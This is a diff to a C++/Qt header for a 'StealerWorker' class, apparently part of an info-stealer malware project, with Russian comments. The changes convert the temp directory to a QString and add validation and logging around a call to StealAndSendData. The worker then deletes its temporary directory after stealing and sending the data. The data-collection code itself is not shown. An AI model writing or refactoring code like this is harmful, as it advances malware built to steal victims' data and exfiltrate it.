@@ -10,40 +10,43 @@
 class StealerWorker : public QObject {
     Q_OBJECT
 public:
-    explicit StealerWorker(MainWindow* window, const std::string& tempDir, QObject* parent = nullptr)
+    explicit StealerWorker(MainWindow* window, const QString& tempDir, QObject* parent = nullptr)
         : QObject(parent), window(window), tempDir(tempDir) {
         if (!window) {
             qWarning("StealerWorker: MainWindow pointer is null");
+        }
+        if (tempDir.isEmpty()) {
+            qWarning("StealerWorker: Temp directory is empty");
         }
     }
 
 public slots:
     void process() {
-        if (!window) {
-            qWarning("StealerWorker: Cannot process, MainWindow is null");
+        if (!window || tempDir.isEmpty()) {
+            qWarning("StealerWorker: Cannot process, invalid parameters");
             emit finished();
             return;
         }
 
         try {
-            std::string processResult = window->StealAndSendData(tempDir); // Переименована переменная
-            qDebug("StealerWorker: Data stealing and sending completed successfully");
-            emit result(QString::fromStdString(processResult)); // Отправляем результат через сигнал
+            std::string processResult = window->StealAndSendData(tempDir.toStdString());
+            qDebug() << "StealerWorker: Data stealing and sending completed successfully";
+            emit result(QString::fromStdString(processResult));
         } catch (const std::exception& e) {
-            qWarning("StealerWorker: Exception during data stealing: %s", e.what());
-            emit result("Ошибка: " + QString::fromStdString(e.what())); // Отправляем ошибку
+            qWarning() << "StealerWorker: Exception during data stealing:" << e.what();
+            emit result("Ошибка: " + QString::fromStdString(e.what()));
         }
 
-        // Очистка временной директории после завершения
+        // Очистка временной директории
         std::error_code ec;
-        std::filesystem::remove_all(tempDir, ec);
+        std::filesystem::remove_all(tempDir.toStdString(), ec);
         if (ec) {
-            qWarning("StealerWorker: Failed to remove temp directory %s: %s", 
-                     tempDir.c_str(), ec.message().c_str());
+            qWarning() << "StealerWorker: Failed to remove temp directory" << tempDir 
+                       << ":" << ec.message().c_str();
             emit result("Ошибка удаления временной директории: " + QString::fromStdString(ec.message()));
         } else {
-            qDebug("StealerWorker: Temp directory %s removed", tempDir.c_str());
-            emit result("Временная директория удалена: " + QString::fromStdString(tempDir));
+            qDebug() << "StealerWorker: Temp directory" << tempDir << "removed";
+            emit result("Временная директория удалена: " + tempDir);
         }
 
         emit finished();
@@ -51,11 +54,11 @@ public slots:
 
 signals:
     void finished();
-    void result(const QString& message); // Новый сигнал для передачи результата
+    void result(const QString& message);
 
 private:
     MainWindow* window;
-    std::string tempDir;
+    QString tempDir;
 };
 
 #endif // STEALERWORKER_H
